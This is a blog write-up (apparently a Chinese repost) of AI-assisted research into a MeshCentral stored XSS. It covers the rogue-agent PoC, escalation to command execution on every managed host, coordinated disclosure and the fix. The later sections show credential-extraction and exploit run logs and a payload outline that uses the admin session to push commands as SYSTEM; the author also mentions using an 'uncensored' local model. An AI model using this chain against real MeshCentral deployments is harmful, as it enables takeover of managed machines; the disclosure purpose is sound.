#  MeshCentral漏洞挖掘手记：从XSS到远程控制，AI助攻的全过程  
 幻泉之洲   2026-06-16 07:56  
  
>   
  
## 为什么挑MeshCentral下手  
  
我一直很喜欢折腾RMM工具里的XSS。这类系统攻击面很立体：渲染UI的Web端、负责上报信息的客户端、还有客户端和服务器之间承载通信的网络协议，每一层都可能出问题。与其盯着常见的Web靶场，不如找个现实里真有人用的。简单搜了一下开源自托管的MDM方案，MeshCentral[1]直接跳出来——几年前我就见过威胁组织拿它当跳板，这要是再翻出点新东西，影响面不会小。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibd1CiacMm3ake1AYsbk30IYMFzLwW9L1SyfdnlH2wTKzS6EFQOVWbOfo4MxrQgOGcjnT3YwiatEG64aqZvIUibwpXHs8PNqSPv7w8/640?wx_fmt=png&from=appmsg "")  
  
定了目标，接下来就是搭配合适的工具链。模型本身有潜力，但想让它干活利索，得教会它怎么做事、给它趁手的工具。我习惯用VSCode里的Claude Code跑，确切地说是code-server部署版，隔离在Proxmox集群里，24小时在线，还能访问我所有内部MCP服务。就算Claude哪天抽风乱执行rm -rf，也伤不到我本机。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdOD5Vkk3ib13rnIaK8mdBNcmYbf4D8WUDWsphyHORACdPbgYJGicTROybaicC0LMMeyfcFZUdaRiaq5ic1pXKD67flGqGgDhtNxqAg/640?wx_fmt=png&from=appmsg "")  
  
项目启动用我的固定命令\project MeshCentral，它会自动搭好文件结构，然后触发Claude开始思考整体计划。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfeXZLpx29bYxxPKia9shsGw9RLtGUNMzZTOkz8tE76kF8aYXI1TOqCsWibFMxs27vGv0ulxKAiceMTgqousHXB7X6zicnNLsT3ZVE/640?wx_fmt=png&from=appmsg "")  
## 从一堆噪音里挖出真漏洞  
  
我让它先看服务端和Web应用。随着分析深入，Claude开始为特定任务启动多个子代理同时跑。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdxAxiaJuMzXicibCdO2YrCK91ygIgA69GsuuffiaF5VBicqn5ySOls2ziaL9FtnyibmsrLrX4ZV2PwoqvR5hGAu6R2mj8dDr3BficJOto/640?wx_fmt=png&from=appmsg "")  
  
最初返回了一大堆结果，但它的假设前提都是“用户登录后能在界面看到什么”，压根没考虑“代理端提交的数据会不会被反射到UI里”。我直接追问了一句：从XSS角度看，如果我们伪造一个代理端上报字段，这些东西会不会被渲染进管理后台？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibesicrlPMoByX68BibiaxskeweKnuticcGhru4DbTzF8Ess4y0TPVXhmvSUTnPleqnqXHYZddPWAEicpicYfmMkqfcUlIHJLia3o6Vr6Q/640?wx_fmt=png&from=appmsg "")  
  
几分钟后，第一条真正有分量的线索浮了出来。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdbWk1Se2TtIsXtQ3v9hzWib3sPsW1CF4COB5ZKg0d34TLob59fxicm3sdFqyJAdpnWO4ibeRsDWgakfpia9Y0ZdXED5EhqxqcZia6k/640?wx_fmt=png&from=appmsg "")  
  
它又开了几个后台代理去深挖具体的代码行，追溯数据从代理端到UI的完整流向。到这里，漏洞假设已经成立，接下来是验证环节。我刚好在家里的Proxmox节点上跑了测试环境，新建Ubuntu虚拟机部署MeshCentral实例，再挂一个Windows虚拟机当正常客户端接入。接着用Claude生成Ansible playbook，几条命令下去，整套环境就绪。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibflcHEYUibSCRvO2cOphaNjTp1UuLF9SGLrmiczEwibUibd0dK7q2W6AfhOs6lhHrAdbEfqWiacGdaZSFW52dyWDAMAOIgINdq8HCTM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdmhSo4tV47JB8UAZ3Bib2cJd1krZJEtfxLgTia7aYpPHMdbtYDXZnnSsyLWQVicyJl4ZqxIPzDM6IRDib1E5nzSIWQGURXRfehecU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibddnO1TMwm9jfMAq7nhllM9Nq5nrBIGKBWLytT7QxYGpiaw8EYicSpvL5IOz73VwFS8G6bWbVnowIK661vcwQvnmRnu2VLsWJq7E/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibe3kfIejTSKiatFDibQIK0yQxQt4qeOySOzxXG7kf2c2UzibNul5tk8FU5w3InqVeWFRnNu3ibHNz6yzzOdD9ibCgUvCmNuo8FiaQaps/640?wx_fmt=png&from=appmsg "")  
## PoC从失败到跑通  
  
下一步是写一个测试客户端来模拟恶意代理。Claude给了几个方案，我直接选了第三个——直奔PoC去。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcWWQ1icSdPrAYrDH2LicomNO0gfEpbybvdUlXXtMicEzyvlvyUrNReFUXPLy5KH80YukSBibQt6FpKg0ND3bLr3weLJb3dTicP145I/640?wx_fmt=png&from=appmsg "")  
  
第一版脚本跑失败了。之后来回迭代了几轮，我负责把报错信息扔给它，它改脚本，反复修正直到拿到一个能成功接入服务器的恶意代理端。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfzicG0XmyrN5s3vyxkyyibuMRQKJOBduojtwjAt5SgP9CIYQzZ2E3OmueTgdDOK1jIVbJ05X8YGX6Pnb2SkBAFdG2zzbGnAenB8/640?wx_fmt=png&from=appmsg "")  
  
脚本能跑了，但还有个现实问题没解决：我们用的是管理员UI里生成的令牌和凭据，这相当于已经拿到Dashboard权限了，那攻击场景还有什么意思？我自己没急着推演，直接把问题抛给Claude：假定我们拿不到安装令牌，但已经控制了一台装有MeshAgent的主机，能不能冒充这个已有的代理？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdtSe10LZFk9dpoiavfPmHbHRpJwmqGx8hsVzcb8Awuf4MdP4lEbSo5RCEdibs8fyWAibeRYPhDZ8suKf770Rvzxd4KJXak2HqnB4/640?wx_fmt=png&from=appmsg "")  
  
它很快定位到关键数据存在磁盘上，而且任何用户都能读取。接着自动生成了一个提取脚本，从本地文件中抓取MeshID、证书、私钥等信息，然后更新PoC脚本，用这些“偷来的”身份去连接服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibc2iaAxoQLho8N1CA5yQ5EeRLP120PxH6nicgIma3gWsQia0OjGTAHTrzhdwJ7KpGWtXDrzJbZbZRpp7VkJpI7YoOZThNiaxTRchic8/640?wx_fmt=png&from=appmsg "")  
  
从搭环境到完成漏洞验证，前后不到一小时。最后一步是调用报告审查代理和写作代理，把发现过程整理成可直接提交给项目维护者的报告。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibf5oLBXYnJAq3W0BXdxmMmZSp9MW1pK4AIsRo636vzO8ClFeJ6TL0Bib7jyc24kskJYcPDExFgPuldTSW04fb6VP7vZLGTFz6ia8/640?wx_fmt=png&from=appmsg "")  
  
统计一下资源消耗：模型用的是Claude Opus 4.6，总耗时1小时11分钟，工具调用96次，启动子代理10个，费用20.34美元，总token量（含缓存）2188万。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeW0ZR3Y8zgia13KX0Gf5VCgiaESp1NIaYaibdFXtwOfyhd3IkTZGNJXWGfk3iba2GGGuF8MoyqHI2GGoiaUxfmCb1P5slrwoueN3Fs/640?wx_fmt=png&from=appmsg "")  
## 本地模型：理论丰满，现实骨感  
  
前沿模型在受限护栏下能做到这个地步，那换成完全没有护栏的本地模型呢？能不能在家用硬件上“免费”复现？我保持相同的技能体系和工作流，只是把Claude Code的后端指向本地LLM。VSCode里切换其实很简单，我用LM Studio做接口，选了个“无审查”模型：DavidAU/OpenAi-GPT-oss-20b-HERETIC-uncensored-NEO-Imatrix-gguf[2]。  
  
我有RTX 5090，能加载完整模型和够大的上下文窗口，但结果一言难尽——它实在太笨了。跑着跑着突然犯迷糊，因为我的Claude.md配置文件里提到了WordPress扫描技能，它竟判断MeshCentral可能是个WordPress插件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibftdvSWk5qqbhDqMlxY5icd6SWMtcLM5RBic5frQuXwrpIGXCDh5mDuYLic2ciaPUsOtB8f1dczcza1LOSlR2hCAdzbCbJeZIIcmDo/640?wx_fmt=png&from=appmsg "")  
  
这对比太鲜明：不是有卡就能平替，模型本身的推理能力目前仍然差着代际。  
## 完整攻击链：从代理欺骗到全域命令执行  
  
如果只关心漏洞本身怎么利用，这部分直接给你看实际效果。全部代码已公开：https://github.com/kevthehermit/MeshCentral-RogueAgent[3]。  
  
攻击起点假设很朴素：你已经拿下了域内一台主机，只是一个普通非管理员用户，或者从VirusTotal之类的平台翻到了现成的安装包。两种情况都很常见。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcoZLuarN24FeKTazAHiaibNWgf0MKtz4dmrS3icwLbtFx6X0ZV12agWjo7W5Glcc8kYtW6c69ejD1memTONLSd4srXolZH5FWeXY/640?wx_fmt=png&from=appmsg "")  
  
先确认目标机器装了MeshCentral，并且非管理员用户对MeshAgent.msh和MeshAgent.db文件有读取权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibejmWbetxibxPqAjTmxLJGplgheHIX5fv1Xibr9BVfrPoylpO8TokUfeeh7QUd5UFvRSyFIBul5gxyib7GhjqjFPf7HyLgboq0GzA/640?wx_fmt=png&from=appmsg "")  
  
把文件拖回来，跑个脚本提取连接凭据：  
  
/projects/meshcentral/scripts$ uv run extract_agent_identity.py /mnt/bughunting/MeshCentral/ -o client.json[*] Extracting MeshAgent identity from: /mnt/bughunting/MeshCentral/[+] Found MSH config: /mnt/bughunting/MeshCentral/meshagent.msh    MeshID:    C540BC7EF62BC107C4617E99FC5C7091...    ServerID:  B1C46BBD7076A6AB2B28694ABA6E5B34...    Server:    wss://mesh.lab.local:443/agent.ashx    MeshName:  Demo[+] Found agent database: /mnt/bughunting/MeshCentral/meshagent.db    Database size: 170868 bytes    Scanning for PFX blobs in database...    Found 1 potential PFX blob(s)    Parsed PFX at offset 189 (3186 bytes, password='hidden')[+] Successfully extracted agent identity!    NodeID:  8hqMQr1iGQmD$jcIRtLWm7zPZ1nK8t@f3I12AXruXMi4fhE9ptAfRa6l58D5BE5g    Cert CN: CN=localhost    Key:     RSA-3072[+] Identity saved to: client.json    Use with: uv run rogue_agent.py -s  --identity client.json  
  
然后用这个身份启动恶意代理：  
  
uv run rogue_agent.py -s mesh.lab.local --identity client.json[+] Loaded stolen identity from: client.json    NodeID:    8hqMQr1iGQmD$jcIRtLWm7zPZ1nK8t@f3I12AXruXMi4fhE9ptAfRa6l58D5BE5g    MeshID:    C540BC7EF62BC107C4617E99FC5C7091...    Server:    wss://mesh.lab.local:443/agent.ashx    Cert CN:   CN=localhost    Key size:  RSA-3072[*] MeshCentral Rogue Agent XSS PoC (IMPERSONATION MODE)[*] Target: mesh.lab.local:443[*] Impersonating NodeID: 8hqMQr1iGQmD$jcIRtLWm7zPZ1nK8t@f3I12AXruXMi4fhE9ptAfRa6l58D5BE5g[*] Payload: alert_simple[*] Connecting to mesh.lab.local:443 to get TLS cert hash...[*] Opening WebSocket to wss://mesh.lab.local:443/agent.ashx[*] Sending Cmd 1 (nonce + cert hash)...[*] Sending Cmd 4 (trust server, skip its signature)...[*] Received Cmd 1 from server (got server nonce)[*] Sending Cmd 2 (agent cert + RSA-SHA384 signature)...[*] Sending Cmd 3 (agent info, name='RogueAgent-Alert')...[*] NodeID: 8hqMQr1iGQmD$jcIRtLWm7zPZ1nK8t@f3I12AXruXMi4fhE9ptAfRa6l58D5BE5g[*] Waiting for authentication...[*] Authenticated! (Cmd 4 received)[*] Received serverInfo - agent fully connected[*] --- Injecting XSS payload: alert_simple ---[*]     name:   RogueAgent-Alert[*]     osdesc: [*] === XSS payload injected! ===[*] Device should appear in MeshCentral UI as 'RogueAgent-Alert'[*] Open the device details panel to trigger the osdesc XSS.[*] Entering interactive mode. Type 'help' for agent commands.  
  
管理员一打开这台设备的面板，默认payload立刻触发。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdXwFxAqZhCAv3bgTRM4BcdRgOvEvy4Meg3OLOpgeuOJfOBiacPIeEpd44XdziaSp8xgFmbbRIKr7fLU1MPhTmfV5FtlX8e6aqzE/640?wx_fmt=png&from=appmsg "")  
## 从弹窗到拿下一群机器  
  
光弹个alert没什么意思，怎么从XSS跳到权限提升或者横向移动？MeshCentral本身就是设备管理平台，设计功能里就包括以nt authority\system权限执行远程命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibfs8peGfWiaEjjh0Ko7fKUhZpjKBM8Er8uHddPD8fKCnbKiaGfAPO8yaHnia84uLoBSSapoYJEzJEgHEMR7sfOxZCajoWpiaQ7B5BM/640?wx_fmt=png&from=appmsg "")  
  
所以我们需要的是一个能下发命令的XSS载荷，而且最好一次性打向所有已连接的主机。实现起来异常简单——直接在XSS里打开一个WebSocket，用管理员的Session Cookie（浏览器自动携带）连到control.ashx，枚举所有节点，然后向每个代理下发runcommands，全部以SYSTEM/root权限执行。  
  
// 完整RCE链：XSS在管理员浏览器触发 → 利用管理员会话打开control.ashx WebSocket → 枚举所有节点 → 向每个代理派发runcommands(calc)，以SYSTEM / root执行。攻击者全程无需凭证。"rce_chain": {    "name": "RogueAgent-RCE",    "osdesc": (        '![]( "")  
'    ),}  
  
XSS到RCE的完整演示效果就不赘述了，执行命令的录像也一并整理进了仓库。  
## 披露、修复与自动化补丁  
  
给开源项目报漏洞通常两条路：石沉大海或者快速响应。MeshCentral属于后者。他们的安全页面写清楚了报告流程，Simon和Ylian很快验证了我提交的内容，接着问我能不能直接开个PR修掉。我之前给了些缓解建议，但转念一想这不正好再测一下AI的极限吗——Claude找到了漏洞，能不能顺手把它修了？  
  
说实话代码层面修复比较直观，这也是LLM目前最强的一类任务。于是它生成补丁，我开了PR[4]，几天后合并，新版本1.1.60发布，附带安全公告。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibc2hhsM16KfvLAJw7zjiaOpEsomBFtM5w8zSkRUeDkpksXFnUYHtr6ibJlqrIhnNibEGsc5d05scVcsnjhjrupbhGibOYADYkz2oAg/640?wx_fmt=png&from=appmsg "")  
  
公告原文摘录：MeshCentral 1.1.59及以下版本中，恶意或被攻破的MeshAgent可通过coreinfo消息中的osdesc字段注入任意HTML/JavaScript。服务器对该值不做任何清理直接存储并在管理界面渲染，导致存储型XSS。最终可借助设备管理功能实现以SYSTEM/root权限执行远程命令。  
## 怎么检测和堵上这个洞  
  
最好的办法就是升级控制台到1.1.60以上。除此之外，MeshCentral自身会记录所有对主机的远程命令执行历史，审计这些日志也能发现异常活动。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfVD16NxY3QmuVLQFxpib2FRU2Usngm5ysPcDB1wesibyLOXW5Vqx11Ula4EWWWNER3VJvOCHcXmsc2Jnj9yooiah9yb3XFPos75E/640?wx_fmt=png&from=appmsg "")  
  
两条命令执行记录清晰可见，取证并不复杂。  
## AI用了多少？  
  
读完这篇东西你肯定发现了，整个研究过程AI参与度很高。但我得说清楚：这篇文章每一个字都是我自己敲的。  
  
从实验设计来看，前沿模型不管是发现漏洞的逻辑链，还是生PoC、写修复补丁，都已经能做到超出预期的水平。但这种能力目前还集中在少数模型上，本地部署的方案受限于推理能力，差得不是一星半点。工具框架（比如我用的MCP服务、子代理调度、报告生成代理）本身也是放大模型能力的杠杆。少了这个架构，单靠一个裸模型是推不出这种结果的。  
  
坦率讲，这次实验最让我不安的不是漏洞本身——其实这种XSS在RMM里不算罕见——而是整个过程太快、成本太低了。20美元、一顿午饭的时间，从零到完整武器化利用链。安全行业对AI辅助攻击的讨论往往停留在概念层面，但这事已经实实在在地发生了。  
### 参考资料  
  
[1]   
https://meshcentral.com/?ref=techanarchy.net  
  
[2]   
https://huggingface.co/DavidAU/OpenAi-GPT-oss-20b-HERETIC-uncensored-NEO-Imatrix-gguf?ref=techanarchy.net  
  
[3]   
https://github.com/kevthehermit/MeshCentral-RogueAgent?ref=techanarchy.net  
  
[4]   
https://github.com/Ylianst/MeshCentral/pull/7823?ref=techanarchy.net  
  
[5]   
https://www.techanarchy.net/meshcentral-from-xss-to-rce/  
  
